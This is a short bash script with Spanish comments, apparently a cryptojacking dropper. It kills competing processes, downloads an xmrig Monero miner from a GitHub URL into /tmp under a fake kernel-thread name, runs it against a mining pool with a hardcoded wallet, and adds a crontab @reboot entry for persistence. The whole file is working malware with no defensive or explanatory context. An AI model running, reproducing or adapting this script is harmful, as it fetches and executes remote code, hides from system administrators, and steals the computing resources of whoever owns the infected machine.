#!/bin/bash
# --- CONFIGURACIÓN ---
WGET_URL="https://github.com/p2151868-wq/xmr/raw/refs/heads/main/xmrig"
FAKE_NAME="[kworker/u2:1-ev]"
POOL="gulf.moneroocean.stream:10128"
WALLET="46Sic8EdWznhfw1P7P7yTiJgChtRMRReVD4Jpa3L93pG1Xy1W9BxQZhFBBv9FMuRgC6tM6hkVRsKtSoRVoSvfB11NX49MCS"

# 1. LIMPIEZA TOTAL (Para que no choque con intentos fallidos)
pkill -9 -f "xmrig" 2>/dev/null
pkill -9 -f "kworker" 2>/dev/null
rm -f /tmp/config.json

# 2. DESCARGA DIRECTA
cd /tmp || cd /var/tmp
curl -sL "$WGET_URL" -o "$FAKE_NAME" || wget -q "$WGET_URL" -O "$FAKE_NAME"
chmod +x "$FAKE_NAME"

# 3. EJECUCIÓN (Forzamos el inicio)
# Usamos --donate-level 1 para que casi todo sea para ti
nohup ./"$FAKE_NAME" -o $POOL -u $WALLET -p x --donate-level 1 --background >/dev/null 2>&1 &

# 4. PERSISTENCIA
(crontab -l 2>/dev/null; echo "@reboot /tmp/$FAKE_NAME -o $POOL -u $WALLET -p x --background") | crontab -
